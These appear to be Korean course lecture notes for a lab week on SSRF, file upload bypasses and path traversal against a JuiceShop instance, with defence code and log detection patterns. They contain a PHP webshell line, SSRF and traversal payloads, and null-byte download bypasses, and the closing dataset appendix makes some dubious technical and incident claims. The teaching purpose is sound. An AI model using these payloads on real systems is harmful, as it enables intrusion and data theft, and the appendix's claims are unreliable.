# Week 07: OWASP A10 + A05 + A03 — SSRF·파일 업로드·경로 탐색

## 학습 목표
- SSRF의 원리와 클라우드 메타데이터 공격을 이해한다
- 파일 업로드 취약점의 유형(확장자·Content-Type·매직 바이트 우회)을 실습한다
- 경로 탐색(Path Traversal)과 Null byte(`%2500`) 우회를 수행한다
- JuiceShop `/ftp` 디렉토리에서 민감 파일을 수집하고 분석한다
- 웹셸 개념과 위험성을 설명하고, 실습에서는 안전한 대체 페이로드로 동작을 확인한다
- 방어 기법(allowlist, 경로 정규화, 샌드박스)을 코드 예시로 제시한다

## 실습 환경

| 호스트 | IP | 역할 |
|--------|-----|------|
| manager | 10.20.30.200 | 실습 기지, Bastion API :8003 |
| secu | 10.20.30.1 | SSRF 내부 타깃 (방화벽/IPS) |
| web | 10.20.30.80 | JuiceShop :3000 — /ftp·/profile/image/* |
| siem | 10.20.30.100 | SSRF 내부 타깃 (Wazuh) |

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | SSRF 원리·실습 (Part 1) | 강의+실습 |
| 0:40-1:10 | 파일 업로드 (Part 2) | 실습 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 경로 탐색 + Null byte (Part 3) | 실습 |
| 2:00-2:40 | /ftp 파일 수집·분석 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 방어·탐지 (Part 5~6) | 강의+실습 |
| 3:20-3:30 | Bastion 자동화 (Part 7) | 실습 |
| 3:30-3:40 | 정리 + 과제 | 정리 |

---

# Part 1: SSRF (Server-Side Request Forgery)

## 1.1 SSRF란

**이것은 무엇인가?** 서버가 사용자 입력으로 받은 URL로 요청을 보내게 만드는 공격. 서버를 "프록시"로 악용하여 **외부에서 접근 불가능한 내부 네트워크**에 접근한다.

**왜 위험한가:**
- 외부에서 차단된 내부 서비스(데이터베이스, 관리 콘솔)에 접근
- 클라우드 **메타데이터 서비스**(169.254.169.254) 접근 → AWS 키 탈취
- 내부 네트워크 스캔 (포트 오픈 여부를 응답 차이로 판별)
- 방화벽 우회

## 1.2 동작 원리

```
[정상]
  사용자 → 서버: "http://example.com/image.png 가져와"
  서버 → example.com: GET /image.png
  서버 → 사용자: 이미지 반환

[SSRF]
  공격자 → 서버: "http://10.20.30.100:9200/ 가져와"
  서버 → 10.20.30.100:9200: GET / (내부 Elasticsearch!)
  서버 → 공격자: 내부 데이터 반환!
```

## 1.3 실제 사례

- **2019 Capital One**: AWS SSRF → EC2 메타데이터 API 접근 → IAM 토큰 탈취 → S3 버킷 1억 명 개인정보 유출. 벌금 $190M
- **2020 Shopify/GitLab**: SSRF → 내부 ELK 조회 → 수 주간의 관리자 동향 유출

## 1.4 실습: SSRF 시도

**이것은 무엇인가?** JuiceShop 프로필 이미지 URL 기능이 URL을 받아 서버가 GET 요청으로 이미지를 받아온다. 이 기능에 내부 IP를 넣으면 서버가 대신 내부 요청을 보낸다.

```bash
# 로그인하여 토큰 획득
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"student@test.com","password":"Student123!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

# 내부 서비스로 SSRF 시도
INTERNAL_TARGETS=(
  "http://10.20.30.100:443/"      # siem Wazuh Dashboard (HTTPS)
  "http://10.20.30.1:8002/"       # secu SubAgent
  "http://10.20.30.200:8003/health" # manager Bastion API
  "http://127.0.0.1:22/"          # web 서버 자신의 SSH
  "http://127.0.0.1:3000/"        # web 자신의 HTTP
)

for target in "${INTERNAL_TARGETS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    http://10.20.30.80:3000/profile/image/url \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "{\"imageUrl\":\"$target\"}" --max-time 3)
  echo "  $target -> HTTP $CODE"
done
```

**결과 해석:**
- 200/302: SSRF 성공 (서버가 내부 요청을 수행)
- 500/timeout: 내부 서비스가 응답 없음 또는 오류
- 400: JuiceShop이 내부 IP 패턴을 차단

**JuiceShop 실제 동작:** 프로필 이미지 기능은 URL로 이미지를 받아 서버 로컬에 저장한다. 내부 서비스 응답이 이미지가 아니면 저장 실패하지만 **요청 자체는 발생** → 내부 네트워크 존재 확인에 악용 가능.

## 1.5 파일 프로토콜 (file://) 시도

```bash
# file:// 프로토콜로 서버 파일 읽기 시도
curl -s -X POST http://10.20.30.80:3000/profile/image/url \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"imageUrl":"file:///etc/passwd"}' \
  | head -c 200
echo ""
```

**결과 해석:** 모던 HTTP 클라이언트 라이브러리는 `file://`을 거부하는 경우가 많다. 하지만 구형 라이브러리(예: Node.js `request` 폐기된 버전)는 허용 → **로컬 파일 유출**.

## 1.6 SSRF 방어

1. **URL 스키마 allowlist**: `http`, `https`만 허용 (`file`, `gopher`, `dict` 거부)
2. **IP allowlist/blocklist**: 사설 IP(10.x, 172.16-31.x, 192.168.x), 링크 로컬(169.254.x), 루프백 차단
3. **DNS 리바인딩 방지**: DNS 질의 결과가 사설 IP로 해결되면 거부
4. **네트워크 분리**: 웹 서버에서 메타데이터 엔드포인트 접근 차단 (IMDSv2, VPC 구성)
5. **응답 크기·Content-Type 제한**: 이미지만 허용, 수 MB 제한

---

# Part 2: 파일 업로드 취약점

## 2.1 왜 위험한가

파일 업로드가 가능하면:
- **웹셸 업로드**: PHP/JSP/ASP 파일 → 브라우저로 OS 명령 실행
- **저장형 XSS**: HTML/SVG 업로드 → 방문자에게 스크립트 실행
- **DoS**: 대용량 파일 반복 업로드
- **덮어쓰기**: 기존 정적 파일을 악성 파일로 교체

## 2.2 웹셸 개념 (이해만, 실행 금지)

웹셸은 웹 서버에 올려서 브라우저로 OS 명령을 실행하는 스크립트:

```php
<?php
// 가장 간단한 PHP 웹셸 (실제 서버에 절대 올리지 말 것)
echo system($_GET['cmd']);
?>
```

사용: `GET http://target.com/uploads/shell.php?cmd=whoami` → 응답에 `www-data` 출력.

**JuiceShop은 Node.js 기반 — PHP 실행 불가**. 업로드된 HTML/SVG가 서비스되면 XSS 벡터 정도.

## 2.3 업로드 검증 우회 매트릭스

| 서버 검증 | 우회 방법 |
|-----------|-----------|
| 확장자 블랙리스트 (`.php` 차단) | 대체 확장자 (`.php5`, `.phtml`, `.pHp`) |
| 확장자 화이트리스트 (`.jpg`만) | 이중 확장자 (`shell.php.jpg`) |
| Content-Type 검사 | 업로드 시 Content-Type: image/jpeg로 위조 |
| 매직 바이트 검사 (`GIF89a` 필요) | 파일 앞에 `GIF89a` 추가 후 뒤에 페이로드 |
| MIME 스니핑 (OS 판단) | 파일 내용에 PHP 태그 + 이미지 바이트 결합 |

## 2.4 실습: JuiceShop 프로필 이미지 업로드

**이것은 무엇인가?** JuiceShop의 `/profile/image/file` 엔드포인트는 이미지 업로드. 다양한 확장자·MIME 조합을 시도해 서버가 어디까지 허용하는지 매핑.

```bash
# 테스트 파일 생성
echo "GIF89a" > /tmp/test.gif
echo '<html><body><script>alert(1)</script></body></html>' > /tmp/xss.html
echo '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>' > /tmp/xss.svg
echo 'test content' > /tmp/test.php

# 각 파일을 image/gif로 위장하여 업로드
for f in test.gif xss.html xss.svg test.php; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
    http://10.20.30.80:3000/profile/image/file \
    -H "Authorization: Bearer $TOKEN" \
    -F "file=@/tmp/$f;type=image/gif")
  echo "  /tmp/$f -> HTTP $CODE"
done
```

**명령 분해:**
- `-F "file=@/tmp/$f;type=image/gif"`: multipart/form-data 업로드 + Content-Type 강제
- 서버가 어떤 검증을 하는지 상태 코드로 판별

**결과 해석:**
- 모두 200이면 서버는 **어떤 검증도 하지 않음** → 심각 취약점
- 일부만 403/415면 Content-Type 또는 매직 바이트 검사 중
- JuiceShop은 확장자 필터가 있으나 우회 가능

## 2.5 업로드 방어

1. **확장자 화이트리스트** (`.jpg`, `.png`, `.gif`만)
2. **매직 바이트 검증** (실제 파일이 해당 포맷인지)
3. **업로드 디렉토리에서 실행 권한 제거** (Apache `Options -ExecCGI`, nginx `location` 설정)
4. **파일명 랜덤 재생성** (UUID)
5. **CDN 분리** (업로드된 파일은 별도 도메인, 쿠키 공유 X)
6. **크기 제한** (수 MB)

---

# Part 3: 경로 탐색 (Path Traversal)

## 3.1 경로 탐색이란

URL·파라미터에 `../`(상위 디렉토리 이동)를 삽입하여 **웹 루트 밖의 파일**에 접근하는 공격.

**동작 원리:**
```
정상: GET /download?file=report.pdf
  서버 경로: /var/www/files/report.pdf

공격: GET /download?file=../../../etc/passwd
  서버 경로: /var/www/files/../../../etc/passwd = /etc/passwd
```

## 3.2 /etc/passwd — 단골 타깃

리눅스에서 `/etc/passwd`는 사용자 계정 정보 파일. 누구나 읽을 수 있어(권한 `644`) 경로 탐색 테스트의 대표적 증거.

```bash
head -5 /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

**결과 해석:** `/etc/passwd`는 패스워드 해시가 없다(`/etc/shadow`가 root만 읽을 수 있는 별도 파일에 있음). 하지만 사용자명 목록이 있어 brute force·sudo 설정 파악에 유용.

## 3.3 JuiceShop `/ftp` 경로 탐색

JuiceShop `/ftp`는 `.md`/`.pdf` 확장자만 허용. 우회 시도.

### Step 1: 정상 다운로드

```bash
# /ftp 파일 목록
curl -s http://10.20.30.80:3000/ftp | python3 -m json.tool | head -20

# 허용 확장자 다운로드
curl -s http://10.20.30.80:3000/ftp/legal.md | head -10
```

**결과 해석:** `.md` 파일은 정상 다운로드. `/ftp` 디렉토리에 `package.json.bak`, `suspicious_errors.yml` 등 확장자가 `.md`/`.pdf`가 아닌 파일도 있는데, 이것들이 공격 대상.

### Step 2: 경로 탐색 기본 시도

```bash
# 기본 ../ 시도
curl -s -o /dev/null -w "%{http_code}\n" http://10.20.30.80:3000/ftp/../../etc/passwd

# URL 인코딩
curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000/ftp/%2e%2e/%2e%2e/etc/passwd"

# 이중 URL 인코딩 (서버가 한 번만 디코딩하는 경우)
curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000/ftp/%252e%252e/%252e%252e/etc/passwd"
```

**결과 해석:** 403/400 반환이면 서버가 `../`를 차단. JuiceShop은 기본 `../`는 차단하지만 다른 기법 허용.

### Step 3: Null byte 우회 (JuiceShop Poison Null Byte 챌린지)

**이것은 무엇인가?** `%00` 또는 `%2500`(더블 인코딩)을 삽입하면, 서버 측 언어가 C 기반 함수를 쓸 때 `\0`을 문자열 종료로 해석. 확장자 검사는 `.md`까지 통과, 실제 열리는 파일은 `\0` 앞까지.

```bash
# 제한 파일을 .md처럼 위장하여 다운로드
echo "== package.json.bak %2500 우회 =="
curl -s "http://10.20.30.80:3000/ftp/package.json.bak%2500.md" | head -30

echo ""
echo "== suspicious_errors.yml 우회 =="
curl -s "http://10.20.30.80:3000/ftp/suspicious_errors.yml%2500.md" | head -20

echo ""
echo "== coupons_2013.md.bak 우회 =="
curl -s "http://10.20.30.80:3000/ftp/coupons_2013.md.bak%2500.md" | head -10
```

**결과 해석:**
- `package.json.bak` → JuiceShop 의존성 버전 정보 노출 (해당 버전 CVE 검색 → 공격 각도 확보)
- `suspicious_errors.yml` → 과거 에러 로그. 어떤 공격이 시도되었는지, 어떤 취약점이 있는지 힌트
- `coupons_2013.md.bak` → 쿠폰 코드 히스토리 (JuiceShop 챌린지 소재)

### Step 4: 다양한 경로 탐색 페이로드

```bash
TRAVERSAL_PAYLOADS=(
  "../etc/passwd"
  "../../etc/passwd"
  "../../../etc/passwd"
  "..%2f..%2f..%2fetc%2fpasswd"
  "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
  "....//....//....//etc/passwd"
  "..%252f..%252f..%252fetc%252fpasswd"
  "%2e%2e%5c%2e%2e%5cetc%5cpasswd"
)

for payload in "${TRAVERSAL_PAYLOADS[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/ftp/$payload" --max-time 3)
  echo "  $payload -> HTTP $CODE"
done
```

**결과 해석:** 서버의 입력 정규화 방식에 따라 어느 페이로드가 통하는지 다름. WAF가 있는 환경에서는 대부분 차단되나, 이중 인코딩(`%252e`) 같은 기법이 가끔 통과.

## 3.4 경로 탐색 방어 코드

```javascript
// Node.js/Express 안전한 파일 다운로드
const path = require('path');
const fs = require('fs');

app.get('/download/:filename', (req, res) => {
  const baseDir = path.resolve('/var/www/files');
  const requested = path.resolve(baseDir, req.params.filename);

  // 핵심: 최종 경로가 baseDir 안에 있는지 검증
  if (!requested.startsWith(baseDir + path.sep)) {
    return res.status(403).send('Forbidden');
  }

  // 확장자 화이트리스트
  if (!['.md', '.pdf'].includes(path.extname(requested))) {
    return res.status(403).send('Unsupported file type');
  }

  res.sendFile(requested);
});
```

**방어의 핵심:**
1. `path.resolve`로 최종 절대경로 계산
2. 이 경로가 baseDir 안에 있는지 `startsWith`로 확인
3. 확장자 화이트리스트
4. Null byte 포함 시 거부 (`req.params.filename.includes('\0')`)

---

# Part 4: /ftp 파일 수집·분석 (실전 정찰)

## 4.1 전체 파일 수집

```bash
mkdir -p /tmp/juiceshop_loot

# 정상 + null byte 우회 모두 시도
for file in "legal.md" "package.json.bak" "coupons_2013.md.bak" "suspicious_errors.yml" "eastere.gg" "acquisitions.md" "incident-support.kdbx"; do
  curl -s "http://10.20.30.80:3000/ftp/$file" -o "/tmp/juiceshop_loot/$file" 2>/dev/null
  curl -s "http://10.20.30.80:3000/ftp/${file}%2500.md" -o "/tmp/juiceshop_loot/${file}.bypass" 2>/dev/null
done

ls -la /tmp/juiceshop_loot/
```

## 4.2 민감 정보 추출

```bash
echo "== package.json.bak (의존성·빌드 정보) =="
cat /tmp/juiceshop_loot/package.json.bak.bypass 2>/dev/null | python3 -m json.tool 2>/dev/null | head -30

echo ""
echo "== suspicious_errors.yml (에러 힌트) =="
cat /tmp/juiceshop_loot/suspicious_errors.yml.bypass 2>/dev/null | head -20

echo ""
echo "== coupons_2013.md.bak =="
cat /tmp/juiceshop_loot/coupons_2013.md.bak.bypass 2>/dev/null | head -10

echo ""
echo "== incident-support.kdbx (KeePass DB) =="
file /tmp/juiceshop_loot/incident-support.kdbx* 2>/dev/null
```

**결과 해석:**
- `package.json.bak` → JuiceShop 정확 버전, npm 의존성 목록 → `npm audit`으로 CVE 탐색
- `suspicious_errors.yml` → 과거 공격 시도 기록 또는 의도적 힌트
- `incident-support.kdbx` → KeePass 암호 DB (마스터 패스워드 필요, brute force 대상)

## 4.3 숨겨진 파일·설정 탐색

```bash
FILES_TO_CHECK=(
  "/.env"
  "/.git/config"
  "/api-docs"
  "/api-docs/swagger.json"
  "/robots.txt"
  "/sitemap.xml"
  "/.htaccess"
  "/security.txt"
  "/.well-known/security.txt"
  "/main.js.map"
)

echo "== JuiceShop :3000 =="
for file in "${FILES_TO_CHECK[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000$file")
  [ "$CODE" != "404" ] && echo "  $file -> HTTP $CODE"
done

echo ""
echo "== Apache :80 =="
for file in "${FILES_TO_CHECK[@]}"; do
  CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80$file")
  [ "$CODE" != "404" ] && echo "  $file -> HTTP $CODE"
done
```

**결과 해석:**
- `/api-docs/swagger.json` 200 → API 전체 구조 노출
- `/main.js.map` 200 → **소스맵** 노출 → 프론트엔드 원본 코드 복원 가능 (개발 빌드 실수 전형)
- `/.env`, `/.git/config` 200 → **매우 심각** (환경변수/Git 내부 노출)

---

# Part 5: 방어 요약

## 5.1 SSRF 방어

```javascript
const url = require('url');
const dns = require('dns').promises;

async function safeFetch(userUrl) {
  const parsed = new URL(userUrl);

  // 1. 스키마 화이트리스트
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Invalid protocol');
  }

  // 2. DNS 해석 후 IP 검증
  const { address } = await dns.lookup(parsed.hostname);
  if (isPrivateIP(address)) {
    throw new Error('Private IP not allowed');
  }

  // 3. 응답 크기 제한
  return fetch(userUrl, { size: 5 * 1024 * 1024 });
}

function isPrivateIP(ip) {
  return /^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.|127\.|169\.254\.)/.test(ip);
}
```

## 5.2 파일 업로드 방어 (요약)

- 확장자 화이트리스트 + 매직 바이트 검증
- 업로드 디렉토리에서 실행 권한 제거
- 파일명 랜덤화
- 크기 제한

## 5.3 경로 탐색 방어 (요약)

- `path.resolve` + `startsWith(baseDir)` 검증
- Null byte 거부
- 확장자 화이트리스트

---

# Part 6: 탐지 (Blue Team)

## 6.1 Wazuh/Apache 로그에서 흔적

```bash
ssh ccc@10.20.30.80 "sudo grep -iE '%2e%2e|%252e|%00|%2500|file://' /var/log/apache2/access.log" 2>/dev/null | head -5
```

**탐지 패턴:**
- URL에 `%2e%2e`, `%2500`, `%00` → 경로 탐색/null byte
- POST 본문에 `file://`, `gopher://`, 사설 IP → SSRF 시도
- 짧은 시간 내 다수 `/ftp/xxx%2500.md` 요청 → 자동화 공격

## 6.2 Suricata 룰 예

- `ET WEB_SPECIFIC_APPS Directory Traversal`
- `ET POLICY file:// URI attempt`

---

# Part 7: Bastion 자연어 자동 점검

```bash
curl -s -X POST http://10.20.30.200:8003/ask \
  -H 'Content-Type: application/json' \
  -d '{
    "message": "JuiceShop(http://10.20.30.80:3000/ftp) 경로의 전체 파일 목록을 수집하고, .md/.pdf가 아닌 파일 각각에 대해 %2500 null byte 우회로 다운로드가 되는지 확인해서 결과 표로 보여줘."
  }' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['answer'])"
```

```bash
curl -s "http://10.20.30.200:8003/evidence?limit=5" | python3 -c "
import sys, json
for e in json.load(sys.stdin)[:5]:
    msg = e.get('user_message','')[:70]
    ok = '✓' if e.get('success') else '✗'
    print(f'  {ok} {msg}')
"
```

---

## 과제 (다음 주까지)

### 과제 1: SSRF·파일·경로 공격 보고서 (60점)

1. **SSRF** (20점)
   - 5개 이상 내부 타깃 URL 테스트 결과표
   - `file://` 프로토콜 시도 결과
   - 클라우드 메타데이터 SSRF의 실제 사례 1건 조사(Capital One 등) 요약

2. **파일 업로드** (15점)
   - `.gif`, `.svg`, `.html`, `.php` 업로드 결과 매트릭스
   - 매직바이트 `GIF89a` + 스크립트 혼합 파일 업로드 시도

3. **경로 탐색** (25점)
   - 8종 이상 페이로드 결과표 (`../`, `%2e%2e`, `%252e`, `\..`, `....//` 등)
   - Null byte(`%2500`)로 `/ftp`의 비허용 확장자 파일 다운로드 → 최소 3개 파일 수집
   - 수집 파일 각각에서 보안상 의미 있는 정보 정리

### 과제 2: 방어 코드 작성 (40점)

1. **SSRF 방어 Node.js 함수** — URL 검증 + DNS 검증 + 사설 IP 차단 — 10점
2. **경로 탐색 방어 함수** — `path.resolve` + `startsWith` + 확장자 화이트리스트 — 10점
3. **파일 업로드 방어 정책** — 확장자·MIME·매직바이트 3중 검증 규칙 — 10점
4. Bastion `/ask`로 자동 점검 결과 + `/evidence` 캡처 — 10점

---

## 다음 주 예고

**Week 08: 중간고사 — CTF 스타일 실습 시험**
- Week 02~07의 모든 기법 종합
- JuiceShop Score Board에서 5개 이상 챌린지 해결
- 보고서 제출 (kill chain + CVSS)

---

## 용어 해설 (이번 주 추가분)

| 용어 | 영문 | 설명 |
|------|------|------|
| **SSRF** | Server-Side Request Forgery | 서버가 대신 요청하게 만드는 공격 (OWASP A10) |
| **메타데이터 API** | IMDS | 클라우드 VM에 IAM 자격증명 제공하는 내부 엔드포인트 (169.254.169.254) |
| **웹셸** | Webshell | 브라우저로 OS 명령 실행하는 서버 업로드 스크립트 |
| **매직 바이트** | Magic Bytes | 파일 포맷을 식별하는 앞쪽 몇 바이트 (`GIF89a`, `%PDF-` 등) |
| **경로 탐색** | Path Traversal | `../`로 상위 디렉토리 이동해 허용 범위 밖 파일 접근 |
| **Null byte** | `%00`/`%2500` | C 기반 함수의 문자열 종료 문자. 확장자 검사 우회용 |
| **더블 인코딩** | Double URL Encoding | `%`를 `%25`로 한 번 더 인코딩 (서버가 한 번만 디코딩할 때 우회) |
| **DNS 리바인딩** | DNS Rebinding | TTL 짧은 DNS로 해석 시점마다 IP를 바꿔 SSRF 우회 |
| **소스맵** | Source Map | 번들된 JS를 원본 소스로 매핑. 실수로 배포 시 코드 노출 |

---

## 📂 실습 참조 파일 가이드

> 이번 주 실제로 사용하는 도구만.

### curl — HTTP 요청

**이번 주 빈번한 패턴:**

| 패턴 | 용도 |
|------|------|
| `-X POST -F "file=@경로;type=image/gif"` | multipart 업로드 |
| `-o 파일` | 다운로드 저장 |
| `--max-time N` | SSRF 타임아웃 (내부 포트 차단 시) |
| `-w "%{http_code}"` | 상태 코드만 |

### JuiceShop 이번 주 대상 엔드포인트

| 엔드포인트 | 메서드 | 취약점 |
|-----------|--------|--------|
| `/profile/image/url` | POST (Bearer) | SSRF (이미지 URL 입력) |
| `/profile/image/file` | POST (Bearer, multipart) | 업로드 검증 우회 |
| `/ftp` | GET | 디렉토리 리스팅 |
| `/ftp/<파일>` | GET | 확장자 필터 (`%2500` 우회) |
| `/api-docs/swagger.json` | GET | API 구조 노출 |
| `/main.js.map` | GET | 소스맵 노출 여부 |

### Bastion API — 이번 주 사용

| 메서드 | 경로 | 용도 |
|--------|------|------|
| POST | `/ask` | 자연어 자동 점검 지시 |
| GET | `/evidence?limit=N` | 기록 조회 |

---

## JuiceShop Score Board 진행 확인

브라우저에서 `http://10.20.30.80:3000/#/score-board` 접속.

- **SSRF** 카테고리 필터 → 해당 챌린지 진행도
- **Broken Access Control** 카테고리 → `/ftp` 경로 관련 챌린지
- 공격 성공 시 Score Board에서 초록색 체크 + 해결 시각 자동 기록
- 이번 주 목표: SSRF/경로 탐색/업로드 관련 3성 이하 챌린지 **최소 3개 해결**

---

> **실습 환경 검증 완료** (2026-03-28): JuiceShop SQLi/XSS/IDOR, nmap, 경로탐색(%2500), sudo NOPASSWD, SSH키, crontab

---

## 실제 사례 (WitFoo Precinct 6 — File 객체 audit 24만건)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *SSRF / 파일 업로드 / 경로 순회 (T1190 + T1083 File and Directory Discovery)* 학습 항목 (파일 핸들·경로 정규화·내부 endpoint 접근) 와 매핑되는 dataset 의 Windows file audit 24만건 분포 + 외부 IP block 패턴.

### Case 1: file 객체 audit (4656/4658/4663/4690)

| message_type | 의미 | 건수 |
|--------------|------|------|
| 4656 | A handle to an object was requested (open) | 79,311 |
| 4658 | The handle was closed | 158,374 |
| 4663 | An attempt was made to access an object | 98 |
| 4690 | An attempt was made to duplicate a handle | 79,254 |
| **합계** | | **316,937** |

→ 4656:4658:4690 비율이 *대략 1:2:1* — *핸들 1번 open 마다 close 1번 + duplicate 1번*. **4663 이 0.12% 만** 인 것이 baseline (*비정상 access* 시 spike).

### Case 2: 외부 IP `100.64.44.5` — file 관련 dst_port 시도

w03 정찰 record 의 일부 — 동일 src 가 여러 dst 의 *file/share 관련 port* 도 시도:
- 5060 SIP / 5632 PCAnywhere / **9418 git** (코드 저장소 노출!)

→ 9418 (git) 시도는 *경로 탐색* 의 일종 — `.git/` 노출 endpoint 에 attacker 가 *전체 코드 base* 다운로드 가능.

**해석 — 본 lecture 와의 매핑**

| SSRF/파일/경로 학습 항목 | 본 record 의 증거 |
|------------------------|------------------|
| **파일 업로드 추적** | 4656 (open) → 4658 (close) 짝 — 업로드된 파일이 *언제 어떤 process 에 의해 read* 되는지 추적 가능. 점검 시 `/upload/` 디렉토리에 audit policy 강제 |
| **경로 순회 (`../`) 탐지** | 4656 ObjectName 필드에 *정규화 전 path* 기록 — 점검 시 `../` 또는 `..%2f` 가 정규화 없이 ObjectName 까지 도달하면 *즉시 critical* |
| **SSRF (T1190)** | 본 dataset 직접 record 부재 — 그러나 9418 git 외부 시도 가 *경로 탐색* 의 한 형태 (외부 git 저장소 enumeration) |
| **handle duplicate 4690** | web 서비스 계정에서 4690 발생 시 *권한 escalation* (web → 다른 process 의 file handle 획득) — 점검 보고서 필수 항목 |
| **MITRE 매핑** | T1190 + T1083 + T1505.003 (Web Shell, file upload via SSRF) |

**학생 실습 액션**:
1. 본인 web 서버에 auditd 의 file write rule 설치 → 업로드 시 4656 record 에 ObjectName 으로 path 가 어떻게 보이는지 확인
2. SSRF payload `http://localhost:80/admin` 시도 후 *내부 IP* (127.0.0.1, 169.254.169.254 AWS metadata) 접근이 audit log 에 어떤 흔적 남기는지 측정
3. 4663 이 *baseline 0.12%* 를 초과하면 어떤 attack pattern 인지 — 점검 보고서의 *anomaly threshold* 설계


